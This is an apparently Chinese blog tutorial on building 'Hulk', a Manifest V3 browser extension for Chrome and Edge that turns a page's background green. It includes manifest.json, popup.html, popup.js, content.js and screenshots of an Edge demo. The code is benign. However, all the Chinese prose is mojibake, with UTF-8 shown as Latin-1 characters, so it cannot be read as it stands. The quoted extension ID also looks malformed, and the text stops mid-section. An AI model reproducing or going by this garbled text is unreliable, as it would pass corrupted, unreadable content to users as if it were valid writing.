æ‰©å±•ç¨‹åºä¸ºä¾‹ï¼Œå…¨é¢å‰–æå…¶å¼€å‘å…¨è¿‡ç¨‹ï¼Œæ¶µç›–äº§å“æ„æ€ã€äº¤äº’è®¾è®¡ã€æŠ€æœ¯é€‰å‹ã€æ–‡ä»¶ç»“æ„ã€æ ¸å¿ƒé€»è¾‘ã€æƒé™é…ç½®ã€è·¨æµè§ˆå™¨å…¼å®¹æ€§ä»¥åŠåä½œå¼€å‘ç†å¿µã€‚å†…å®¹åŸºäºå®Œæ•´çš„é¡¹ç›®æ–‡æ¡£ï¼ŒåŒ…æ‹¬ <code>instruction.txt</code>ã€<code>manifest.json</code>ã€<code>popup.html</code>ã€<code>popup.js</code>ã€<code>content.js</code> ä¸ <code>readme.md</code>ï¼Œå¹¶ç»“åˆæµè§ˆå™¨æ‰©å±•å¼€å‘çš„æœ€ä½³å®è·µè¿›è¡Œæ·±åº¦è¡¥å……ã€‚</p>
<hr/>
<h2 data-id="heading-0">ğŸ§  èƒŒæ™¯ä¸äº§å“ç†å¿µï¼šVibe Coding ä¸æ–‡æ¡£é©±åŠ¨å¼€å‘</h2>
<p>åœ¨ Vibe Coding çš„åä½œæ¨¡å¼ä¸­ï¼Œ<strong>æ–‡æ¡£æ¯”ä»£ç æ›´é‡è¦</strong>ã€‚AI ç¼–ç¨‹åŠ©æ‰‹ï¼ˆå¦‚ Traeï¼‰æ“…é•¿ç”Ÿæˆæ ‡å‡†åŒ–ã€å¯é¢„æµ‹çš„ä»£ç ç‰‡æ®µï¼Œä½†å¯¹æ¨¡ç³Šéœ€æ±‚ã€è§†è§‰è¯­ä¹‰æˆ–å¤æ‚ä¸Šä¸‹æ–‡ç†è§£èƒ½åŠ›æœ‰é™ã€‚å› æ­¤ï¼Œäººç±»å¼€å‘è€…çš„æ ¸å¿ƒä»·å€¼åœ¨äºï¼š</p>
<ul>
<li>æ’°å†™ç²¾å‡†çš„éœ€æ±‚æ–‡æ¡£ï¼ˆå¦‚ <code>instruction.txt</code>ï¼‰</li>
<li>æä¾› UX/UI è®¾è®¡ç¨¿ï¼ˆå¦‚ <code>ux.png</code>ï¼‰</li>
<li>æ„å»ºæ¸…æ™°çš„æŠ€æœ¯æ¶æ„ä¸ç›®å½•ç»“æ„</li>
<li>å®šä¹‰æ¥å£è§„èŒƒã€æµ‹è¯•ç”¨ä¾‹ä¸è¾¹ç•Œæ¡ä»¶</li>
</ul>
<p>è¿™ç§â€œäººæœºåä½œâ€èŒƒå¼ä¸‹ï¼ŒHulk æ‰©å±•çš„è¯ç”Ÿæ­£æ˜¯å…¸å‹åœºæ™¯ï¼š<strong>é€šè¿‡ä¸€ä¸ªæç®€åŠŸèƒ½ï¼ˆå°†ç½‘é¡µèƒŒæ™¯å˜ç»¿ï¼‰ï¼ŒéªŒè¯ä»éœ€æ±‚æè¿°åˆ°å¤šç«¯éƒ¨ç½²çš„å®Œæ•´é“¾è·¯</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-1">ğŸ¯ åŠŸèƒ½éœ€æ±‚è¯¦è§£</h2>
<p>æ ¹æ® <code>instruction.txt</code> çš„æ˜ç¡®æŒ‡ä»¤ï¼ŒHulk æ‰©å±•éœ€æ»¡è¶³ä»¥ä¸‹è¦æ±‚ï¼š</p>
<ol>
<li><strong>åç§°</strong>ï¼šHulk</li>
<li><strong>ç›®æ ‡å¹³å°</strong>ï¼šåŒæ—¶å…¼å®¹ <strong>Chrome</strong> ä¸ <strong>Edge</strong>ï¼ˆä¸¤è€…å‡åŸºäº Chromium å†…æ ¸ï¼ŒManifest V3 å…¼å®¹ï¼‰</li>
<li><strong>å›¾æ ‡</strong>ï¼šä½¿ç”¨ <code>icons/</code> ç›®å½•ä¸‹çš„ä¸‰å¥—å°ºå¯¸å›¾æ ‡ï¼ˆ16pxã€48pxã€128pxï¼‰</li>
<li><strong>äº¤äº’æµç¨‹</strong>ï¼š
<ul>
<li>ç”¨æˆ·ç‚¹å‡»æµè§ˆå™¨å·¥å…·æ ä¸­çš„ Hulk å›¾æ ‡</li>
<li>å¼¹å‡ºçª—å£ï¼ˆPopupï¼‰æ˜¾ç¤ºé»˜è®¤æç¤ºæ–‡æœ¬ï¼š
<ul>
<li>â€œæ”¹å˜èƒŒæ™¯é¢œè‰²â€</li>
<li>â€œç‚¹å‡»ä¸‹æ–¹æŒ‰é’®å°†å½“å‰é¡µé¢èƒŒæ™¯æ”¹æˆç»¿è‰²â€</li>
</ul>
</li>
<li>é¡µé¢åº•éƒ¨åŒ…å«ä¸€ä¸ªâ€œæ”¹å˜é¢œè‰²â€æŒ‰é’®</li>
</ul>
</li>
<li><strong>æ ¸å¿ƒè¡Œä¸º</strong>ï¼š
<ul>
<li>ç‚¹å‡»æŒ‰é’®åï¼Œ<strong>å½“å‰æ´»åŠ¨æ ‡ç­¾é¡µçš„èƒŒæ™¯è‰²å˜ä¸ºç»¿è‰²ï¼ˆ#27ae60ï¼‰</strong></li>
<li>éœ€å¤„ç†å¸¸è§é¡µé¢å¸ƒå±€å…ƒç´ ï¼ˆå¦‚ divã€section ç­‰ï¼‰ï¼Œé¿å…ç™½è‰²åŒºå—æ®‹ç•™</li>
</ul>
</li>
</ol>
<blockquote>
<p>ğŸ’¡ æ³¨æ„ï¼šè¯¥éœ€æ±‚å¼ºè°ƒ <strong>UX ä¸€è‡´æ€§</strong> ä¸ <strong>è§†è§‰å®Œæ•´æ€§</strong>ï¼Œè€Œéç®€å•ä¿®æ”¹ <code>&lt;body&gt;</code> èƒŒæ™¯è‰²ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-2">ğŸ“ é¡¹ç›®æ–‡ä»¶ç»“æ„</h2>
<p>ä¸€ä¸ªæ ‡å‡†çš„ Manifest V3 æ‰©å±•é€šå¸¸åŒ…å«ä»¥ä¸‹æ ¸å¿ƒæ–‡ä»¶ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">hulk-extension/
â”œâ”€â”€ manifest.json          <span class="hljs-comment"># æ‰©å±•å…ƒæ•°æ®ä¸æƒé™å£°æ˜</span>
â”œâ”€â”€ popup.html             <span class="hljs-comment"># å¼¹å‡ºçª—å£çš„ HTML ç»“æ„</span>
â”œâ”€â”€ popup.js               <span class="hljs-comment"># å¼¹å‡ºçª—å£çš„äº¤äº’é€»è¾‘</span>
â”œâ”€â”€ content.js             <span class="hljs-comment"># æ³¨å…¥åˆ°ç½‘é¡µä¸­çš„è„šæœ¬ï¼Œæ‰§è¡Œ DOM æ“ä½œ</span>
â”œâ”€â”€ icons/
â”‚   â”œâ”€â”€ icon16.png
â”‚   â”œâ”€â”€ icon48.png
â”‚   â””â”€â”€ icon128.png
â””â”€â”€ ux.png                 <span class="hljs-comment"># ï¼ˆå‚è€ƒç”¨ï¼‰UI/UX è®¾è®¡ç¨¿ï¼ˆæœªåœ¨ä»£ç ä¸­ç›´æ¥å¼•ç”¨ï¼‰</span>
</code></pre>
<p>æ­¤ç»“æ„æ¸…æ™°åˆ†ç¦»äº† <strong>UI å±‚</strong>ï¼ˆpopupï¼‰ã€<strong>é€»è¾‘å±‚</strong>ï¼ˆpopup.js + content.jsï¼‰ä¸ <strong>é…ç½®å±‚</strong>ï¼ˆmanifest.jsonï¼‰ã€‚</p>
<hr/>
<h2 data-id="heading-3">ğŸ“œ manifest.jsonï¼šæ‰©å±•çš„â€œèº«ä»½è¯â€</h2>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"manifest_version"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Hulk"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"å°†ç½‘é¡µèƒŒæ™¯é¢œè‰²æ”¹ä¸ºç»¿è‰²çš„æµè§ˆå™¨æ‰©å±•"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"icons"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"16"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"icons/icon16.png"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"48"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"icons/icon48.png"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"128"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"icons/icon128.png"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"action"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"default_popup"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"popup.html"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"permissions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-string">"activeTab"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-string">"scripting"</span>
  <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"content_scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"matches"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"&lt;all_urls&gt;"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"js"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"content.js"</span><span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-4">å…³é”®å­—æ®µè§£æï¼š</h3>
<ul>
<li><strong><code>manifest_version: 3</code></strong>ï¼šé‡‡ç”¨æœ€æ–° Manifest V3 è§„èŒƒï¼Œå®‰å…¨æ€§æ›´é«˜ï¼Œç¦æ­¢è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</li>
<li><strong><code>action.default_popup</code></strong>ï¼šå®šä¹‰ç‚¹å‡»æ‰©å±•å›¾æ ‡æ—¶å¼¹å‡ºçš„ HTML æ–‡ä»¶ã€‚</li>
<li><strong><code>permissions</code></strong>ï¼š
<ul>
<li><code>activeTab</code>ï¼šå…è®¸æ‰©å±•ä¸´æ—¶è®¿é—®å½“å‰æ¿€æ´»çš„æ ‡ç­¾é¡µï¼ˆæ— éœ€æ°¸ä¹…æƒé™ï¼‰ã€‚</li>
<li><code>scripting</code>ï¼šManifest V3 ä¸­ç”¨äºåŠ¨æ€æ³¨å…¥è„šæœ¬çš„æƒé™ï¼ˆä½†æœ¬é¡¹ç›®ä½¿ç”¨é™æ€ content_scriptsï¼Œæ­¤æƒé™å¯èƒ½å†—ä½™ï¼Œä¿ç•™ä»¥å…¼å®¹æœªæ¥æ‰©å±•ï¼‰ã€‚</li>
</ul>
</li>
<li><strong><code>content_scripts.matches</code></strong>ï¼š<code>&lt;all_urls&gt;</code> è¡¨ç¤º content.js å°†æ³¨å…¥åˆ°æ‰€æœ‰ç½‘é¡µä¸­ï¼ˆéœ€ç”¨æˆ·è°¨æ…æˆæƒï¼‰ã€‚</li>
</ul>
<blockquote>
<p>âš ï¸ å®‰å…¨æç¤ºï¼š<code>&lt;all_urls&gt;</code> æƒé™æ•æ„Ÿï¼Œå®é™…å‘å¸ƒæ—¶åº”é™åˆ¶ä¸ºå¿…è¦åŸŸåã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-5">ğŸ–¼ï¸ popup.htmlï¼šç”¨æˆ·äº¤äº’å…¥å£</h2>
<pre><code class="hljs language-html" lang="html">Hulkæ‰©å±•æ”¹å˜èƒŒæ™¯é¢œè‰²ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®å°†å½“å‰é¡µé¢èƒŒæ™¯æ”¹æˆç»¿è‰²æ”¹å˜é¢œè‰²
</code></pre>
<p>è™½ç„¶åŸå§‹å†…å®¹æœªä½¿ç”¨æ ‡å‡† HTML æ ‡ç­¾ï¼Œä½†åˆç†æ¨æ–­å…¶åº”ä¸ºï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
    <span class="hljs-selector-tag">body</span> { <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>; <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>; <span class="hljs-attribute">font-family</span>: sans-serif; }
    <span class="hljs-selector-tag">h3</span> { <span class="hljs-attribute">margin</span>: <span class="hljs-number">5px</span> <span class="hljs-number">0</span>; }
    <span class="hljs-selector-tag">p</span> { <span class="hljs-attribute">margin</span>: <span class="hljs-number">5px</span> <span class="hljs-number">0</span>; <span class="hljs-attribute">color</span>: <span class="hljs-number">#555</span>; <span class="hljs-attribute">font-size</span>: <span class="hljs-number">13px</span>; }
    <span class="hljs-selector-tag">button</span> { <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">10px</span>; <span class="hljs-attribute">padding</span>: <span class="hljs-number">6px</span> <span class="hljs-number">12px</span>; <span class="hljs-attribute">background</span>: <span class="hljs-number">#27ae60</span>; <span class="hljs-attribute">color</span>: white; <span class="hljs-attribute">border</span>: none; <span class="hljs-attribute">cursor</span>: pointer; }
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>Hulkæ‰©å±•<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>æ”¹å˜èƒŒæ™¯é¢œè‰²<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®å°†å½“å‰é¡µé¢èƒŒæ™¯æ”¹æˆç»¿è‰²<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"changeColor"</span>&gt;</span>æ”¹å˜é¢œè‰²<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"popup.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>æ­¤é¡µé¢ç®€æ´æ˜äº†ï¼Œç¬¦åˆ UX è®¾è®¡å›¾ <code>ux.png</code> çš„é¢„æœŸã€‚</p>
<hr/>
<h2 data-id="heading-6">âš™ï¸ popup.jsï¼šæ¶ˆæ¯è°ƒåº¦ä¸­æ¢</h2>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'DOMContentLoaded'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> changeColorButton = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'changeColor'</span>);
  changeColorButton.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    chrome.<span class="hljs-property">tabs</span>.<span class="hljs-title function_">query</span>({<span class="hljs-attr">active</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">currentWindow</span>: <span class="hljs-literal">true</span>}, <span class="hljs-keyword">function</span>(<span class="hljs-params">tabs</span>) {
      chrome.<span class="hljs-property">tabs</span>.<span class="hljs-title function_">sendMessage</span>(tabs[<span class="hljs-number">0</span>].<span class="hljs-property">id</span>, {
        <span class="hljs-attr">action</span>: <span class="hljs-string">"changeBackgroundColor"</span>,
        <span class="hljs-attr">color</span>: <span class="hljs-string">"#27ae60"</span>
      }, <span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response);
      });
    });
  });
});
</code></pre>
<h3 data-id="heading-7">å·¥ä½œæµç¨‹ï¼š</h3>
<ol>
<li>ç›‘å¬ DOM åŠ è½½å®Œæˆï¼Œç¡®ä¿æŒ‰é’®å­˜åœ¨ã€‚</li>
<li>ç»‘å®šç‚¹å‡»äº‹ä»¶ã€‚</li>
<li>ä½¿ç”¨ <code>chrome.tabs.query</code> è·å–å½“å‰æ´»åŠ¨æ ‡ç­¾é¡µã€‚</li>
<li>é€šè¿‡ <code>chrome.tabs.sendMessage</code> å‘è¯¥æ ‡ç­¾é¡µçš„ <strong>content script</strong> å‘é€æ¶ˆæ¯ã€‚</li>
<li>æ¶ˆæ¯åŒ…å« <code>action</code> å’Œ <code>color</code> å­—æ®µï¼Œä½œä¸ºæŒ‡ä»¤åè®®ã€‚</li>
</ol>
<blockquote>
<p>ğŸ”— æ­¤å¤„å»ºç«‹äº† <strong>Popup â†’ Content Script</strong> çš„å•å‘é€šä¿¡é€šé“ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-8">ğŸ¨ content.jsï¼šDOM æ“æ§å¼•æ“</h2>
<pre><code class="hljs language-javascript" lang="javascript">chrome.<span class="hljs-property">runtime</span>.<span class="hljs-property">onMessage</span>.<span class="hljs-title function_">addListener</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">request, sender, sendResponse</span>) {
  <span class="hljs-keyword">if</span> (request.<span class="hljs-property">action</span> === <span class="hljs-string">"changeBackgroundColor"</span>) {
    <span class="hljs-title function_">changeBackgroundColor</span>(request.<span class="hljs-property">color</span> || <span class="hljs-string">'#27ae60'</span>);
    <span class="hljs-title function_">sendResponse</span>({<span class="hljs-attr">status</span>: <span class="hljs-string">"success"</span>, <span class="hljs-attr">message</span>: <span class="hljs-string">"èƒŒæ™¯é¢œè‰²å·²æ›´æ”¹"</span>});
  }
  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// ä¿æŒæ¶ˆæ¯é€šé“å¼€æ”¾ä»¥æ”¯æŒå¼‚æ­¥å“åº”</span>
});

<span class="hljs-keyword">function</span> <span class="hljs-title function_">changeBackgroundColor</span>(<span class="hljs-params">color</span>) {
  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = color;

  <span class="hljs-keyword">const</span> elements = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'div, section, header, footer, article'</span>);
  elements.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">el</span> =&gt;</span> {
    <span class="hljs-keyword">const</span> currentBgColor = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">getComputedStyle</span>(el).<span class="hljs-property">backgroundColor</span>;
    <span class="hljs-keyword">if</span> (
      currentBgColor === <span class="hljs-string">'rgba(0, 0, 0, 0)'</span> ||
      currentBgColor === <span class="hljs-string">'transparent'</span> ||
      currentBgColor === <span class="hljs-string">'rgb(255, 255, 255)'</span> ||
      currentBgColor === <span class="hljs-string">''</span>
    ) {
      el.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = <span class="hljs-string">'transparent'</span>;
    }
  });
}
</code></pre>
<h3 data-id="heading-9">æ ¸å¿ƒç­–ç•¥ï¼š</h3>
<ul>
<li><strong>ä¸»èƒŒæ™¯è®¾ç½®</strong>ï¼šç›´æ¥ä¿®æ”¹ <code>document.body.style.backgroundColor</code>ã€‚</li>
<li><strong>å­å…ƒç´ æ¸…ç†</strong>ï¼šéå†å¸¸è§å®¹å™¨å…ƒç´ ï¼Œè‹¥å…¶èƒŒæ™¯ä¸º <strong>é€æ˜</strong> æˆ– <strong>çº¯ç™½</strong>ï¼Œåˆ™è®¾ä¸º <code>transparent</code>ï¼Œé¿å…â€œç™½å—é®æŒ¡ç»¿è‰²èƒŒæ™¯â€ã€‚</li>
<li><strong>å…¼å®¹æ€§å¤„ç†</strong>ï¼šä½¿ç”¨ <code>window.getComputedStyle</code> è·å–çœŸå®æ¸²æŸ“æ ·å¼ï¼Œè€Œéå†…è” styleã€‚</li>
</ul>
<blockquote>
<p>âœ… æ­¤è®¾è®¡æ˜¾è‘—æå‡è§†è§‰ä¸€è‡´æ€§ï¼Œå°¤å…¶åœ¨å¤æ‚ç½‘é¡µï¼ˆå¦‚æ–°é—»ç«™ã€ç”µå•†é¦–é¡µï¼‰ä¸­æ•ˆæœæ˜æ˜¾ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-10">ğŸŒ è·¨æµè§ˆå™¨å…¼å®¹æ€§ï¼šChrome ä¸ Edge</h2>
<p>ç”±äº Microsoft Edge è‡ª 2020 å¹´èµ·é‡‡ç”¨ Chromium å†…æ ¸ï¼Œ<strong>Manifest V3 æ‰©å±•å¯æ— ç¼è¿è¡Œäº Chrome ä¸ Edge</strong>ã€‚åªéœ€æ³¨æ„ï¼š</p>
<ul>
<li>åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fchrome.google.com%2Fwebstore" target="_blank" title="https://chrome.google.com/webstore" ref="nofollow noopener noreferrer">Chrome Web Store</a> ä¸ <a href="https://link.juejin.cn?target=https%3A%2F%2Fmicrosoftedge.microsoft.com%2Faddons" target="_blank" title="https://microsoftedge.microsoft.com/addons" ref="nofollow noopener noreferrer">Microsoft Edge Add-ons</a> åˆ†åˆ«æäº¤ã€‚</li>
<li>æµ‹è¯•æ—¶éœ€åœ¨ä¸¤ä¸ªæµè§ˆå™¨ä¸­éªŒè¯ <code>activeTab</code> æƒé™è¡Œä¸ºæ˜¯å¦ä¸€è‡´ã€‚</li>
<li>å›¾æ ‡æ ¼å¼ï¼ˆPNGï¼‰ã€å°ºå¯¸è¦æ±‚å®Œå…¨ç›¸åŒã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-11">ğŸ“± å®é™…æ¼”ç¤ºï¼šåœ¨ Edge æµè§ˆå™¨ä¸­è¿è¡Œ Hulk æ‰©å±•</h2>
<p>ä»¥ä¸‹æ˜¯ <strong>Hulk æ‰©å±•åœ¨ Microsoft Edge æµè§ˆå™¨ä¸­çš„çœŸå®è¿è¡Œæ•ˆæœ</strong>ï¼Œå±•ç¤ºäº†ä»å®‰è£…åˆ°äº¤äº’çš„å®Œæ•´æµç¨‹ï¼š</p>
<h3 data-id="heading-12">ğŸ”¹ æ­¥éª¤ä¸€ï¼šæ‰©å±•ç®¡ç†ç•Œé¢</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/34f7b5ff1307459cba15664f851ee9cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmluZ19SYWluYm93:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766047437&amp;x-signature=Bq%2FU1lOpRT5hD0cqRRTeMIwJXtU%3D" alt="image.png" loading="lazy"/></p>
<p>åœ¨ Edge çš„â€œæ‰©å±•ç¨‹åºâ€ç®¡ç†é¡µé¢ä¸­ï¼Œå¯ä»¥çœ‹åˆ° Hulk æ‰©å±•å·²æˆåŠŸå®‰è£…ï¼ŒçŠ¶æ€ä¸ºå¯ç”¨ï¼ˆè“è‰²å¼€å…³å¼€å¯ï¼‰ï¼ŒID ä¸º <code>oachojhhfnmlmlmnhepcdphicggpd</code>ã€‚è¿™è¡¨æ˜æ‰©å±•å·²æ­£ç¡®åŠ è½½ï¼Œä¸”å…·å¤‡åŸºæœ¬è¿è¡Œæ¡ä»¶ã€‚</p>
<blockquote>
<p>ğŸ“Œ è¯´æ˜ï¼šæ‰©å±• ID æ˜¯ç”±æµè§ˆå™¨è‡ªåŠ¨ç”Ÿæˆçš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œç”¨äºåœ¨ä¸åŒè®¾å¤‡é—´åŒæ­¥å’Œè¯†åˆ«ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-13">ğŸ”¹ æ­¥éª¤äºŒï¼šç‚¹å‡»å›¾æ ‡å¼¹å‡º Popup</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1eaa5e2a14734d3389205d85c52de800~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmluZ19SYWluYm93:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766047437&amp;x-signature=Trg6w7QpShLnUk8oP1McNcM1Oy4%3D" alt="image.png" loading="lazy"/></p>
<p>å½“ç”¨æˆ·ç‚¹å‡»å·¥å…·æ ä¸­çš„ Hulk å›¾æ ‡æ—¶ï¼Œå¼¹å‡ºçª—å£æ­£å¸¸æ˜¾ç¤ºï¼š</p>
<ul>
<li>æ ‡é¢˜ï¼šâ€œæ”¹å˜èƒŒæ™¯é¢œè‰²â€</li>
<li>æè¿°ï¼šâ€œç‚¹å‡»ä¸‹æ–¹æŒ‰é’®å°†å½“å‰é¡µé¢èƒŒæ™¯æ”¹æˆç»¿è‰²â€</li>
<li>æŒ‰é’®ï¼šâ€œæ”¹å˜é¢œè‰²â€ï¼ˆç»¿è‰²èƒŒæ™¯ï¼Œç™½è‰²æ–‡å­—ï¼‰</li>
</ul>
<p>è¯¥ç•Œé¢ä¸ <code>popup.html</code> å®Œå…¨ä¸€è‡´ï¼Œè¯æ˜å‰ç«¯èµ„æºåŠ è½½æ— è¯¯ã€‚</p>
<hr/>
<h3 data-id="heading-14">ğŸ”¹ æ­¥éª¤ä¸‰ï¼šç‚¹å‡»æŒ‰é’®è§¦å‘èƒŒæ™¯å˜æ›´</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b1dcb629e2844f0584fe876a7aceb734~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmluZ19SYWluYm93:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766047437&amp;x-signature=WG%2B8JfL5SdxTP%2FGeeXuHV0WUcTY%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ca705c79c0c42799d039cbdc3d32837~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmluZ19SYWluYm93:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766047437&amp;x-signature=dY7ir%2Bjlfk064clcbXcC6zudzw0%3D" alt="image.png" loading="lazy"/></p>
<p>åœ¨ç‚¹å‡»â€œæ”¹å˜é¢œè‰²â€æŒ‰é’®åï¼Œ<strong>æ•´ä¸ªç½‘é¡µèƒŒæ™¯ç«‹å³å˜ä¸ºæ·±ç»¿è‰²ï¼ˆ#27ae60ï¼‰</strong>ï¼Œä¸”ï¼š</p>
<ul>
<li>æ‰€æœ‰åŸæœ¬ä¸ºç™½è‰²çš„ <code>div</code>ã€<code>section</code> ç­‰å…ƒç´ å‡è¢«æ¸…é™¤èƒŒæ™¯è‰²ï¼Œä¸å†é®æŒ¡ç»¿è‰²ä¸»èƒŒæ™¯ã€‚</li>
<li>é¡µé¢å†…å®¹ä»å¯æ­£å¸¸é˜…è¯»ï¼Œæ— æ–‡å­—é¢œè‰²å†²çªã€‚</li>
<li>å¸ƒå±€æœªå‘ç”Ÿé”™ä¹±ï¼Œè¯´æ˜ CSS æ¸²æŸ“ä¼˜å…ˆçº§å¤„ç†å¾—å½“ã€‚</li>
</ul>
<blockquote>
<p>âœ… è¿™æ­£æ˜¯ <code>content.js</code> ä¸­ <code>changeBackgroundColor</code> å‡½æ•°çš„é¢„æœŸæ•ˆæœâ€”â€”ä¸ä»…æ”¹ä¸»èƒŒæ™¯ï¼Œè¿˜ä¸»åŠ¨æ¸…ç†å¹²æ‰°å…ƒç´ ã€‚</p>
</blockquote>
<blockquote>
<p>æ³¨ï¼šè¯¥ç‰ˆä¸ºç‚¹å‡»åˆ·æ–°ä¼šæ¢å¤åŸçŠ¶</p>
</blockquote>
<hr/>
<h3 data-id="heading-15">ğŸ”¹ æ­¥éª¤å››ï¼šæ¢å¤åŸçŠ¶ï¼ˆå¯é€‰ï¼‰</h3>
<p>å†æ¬¡ç‚¹å‡»â€œæ”¹å˜é¢œè‰²â€æŒ‰é’®ï¼Œå¯é€šè¿‡ä»¥ä¸‹æ–¹å¼å®ç°èƒŒæ™¯è¿˜åŸï¼š</p>
